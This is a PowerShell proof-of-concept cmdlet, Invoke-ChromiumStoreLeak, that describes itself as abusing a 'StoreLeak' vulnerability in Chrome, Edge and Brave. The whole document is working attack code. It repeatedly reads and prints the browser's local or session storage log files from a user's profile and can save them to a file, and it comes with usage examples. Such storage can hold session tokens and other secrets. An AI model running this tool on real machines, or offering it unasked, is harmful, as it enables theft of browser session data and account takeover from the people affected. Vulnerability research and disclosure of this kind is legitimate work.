function Invoke-ChromiumStoreLeak {
    <#
    .SYNOPSIS

        Abuse the StoreLeak vulnerability in Chromium-based browsers.

    .DESCRIPTION

        This cmdlet is a simple Proof of Concept for the StoreLeak vulnerability.

    .PARAMETER Browser

        Required. Defines the chromium-based profile in use.

    .PARAMETER Storage

        Required. Defines the storage type (either local or session storage).

    .PARAMETER Profile

        Defines the user profile in use.

    .PARAMETER OutFile

        Defines an output file for the leaked data.

    .PARAMETER Interval

        Defines the interval in seconds for the log read.

    .EXAMPLE

        Invoke-ChromiumStoreLeak -Browser Chrome -Storage Session -Profile Test

        Description
        -----------
        Get session storage of the 'Test' chrome profile every second.

    .EXAMPLE

        Invoke-ChromiumStoreLeak -Browser Chrome -Storage Session -Interval 5

        Description
        -----------
        Get session storage of chrome every 5 seconds.

    .EXAMPLE

        Invoke-ChromiumStoreLeak -Browser Edge -Storage Local -OutFile edge-local.txt

        Description
        -----------
        Get session storage of edge and store it in a text file.

    .NOTES
        Author: Idan Lerman
        Alias: @idabian
        Version: 1.0
    #>
    param (
        [Parameter (Mandatory = $True)]
        [ValidateSet("Chrome", "Edge", "Brave")]
        [string]
        $Browser,

        [Parameter (Mandatory = $True)]
        [ValidateSet("Local", "Session")]
        [string]
        $Storage,

        [Parameter (Mandatory = $False)]
        [string]
        $Profile = "Default",

        [Parameter (Mandatory = $False)]
        [string]
        $OutFile,

        [Parameter (Mandatory = $False)]
        [int32]
        $Interval = 1
    )

    # Variables:
    $BrowserMap = @{
        Chrome = "Google\Chrome"
        Edge = "Microsoft\Edge"
        Brave = "BraveSoftware\Brave-Browser"
    }
    $oldData = ""

    # Path to storage logs:
    $BrowserPath = $BrowserMap[$Browser]
    $StoragePath = "$env:LOCALAPPDATA\$BrowserPath\User Data\$Profile\$Storage Storage"
    
    # Loop for continuous updates:
    while ($true) {
        Write-Host -ForegroundColor Green "`n`n---- PULLING STORAGE LOG ----"
        Get-ChildItem -Recurse -Path $StoragePath -Filter "*.log" | ForEach-Object {
            $Content = Get-Content -Path $_.FullName
            if ($oldData -ne $Content) {
                $PlainContent = $Content -replace "`0", ""
                Write-Host $PlainContent
                if ($OutFile) {
                    Add-Content -Value "`n`n---- PULLING STORAGE LOG ($(Get-Date -Format "dd/MM/yyyy HH:mm:ss 'GMT'z")) ----`n$PlainContent`n" -Path $OutFile
                }
                $oldData = $Content
            }
        }
        Start-Sleep -Seconds $Interval
    }
}
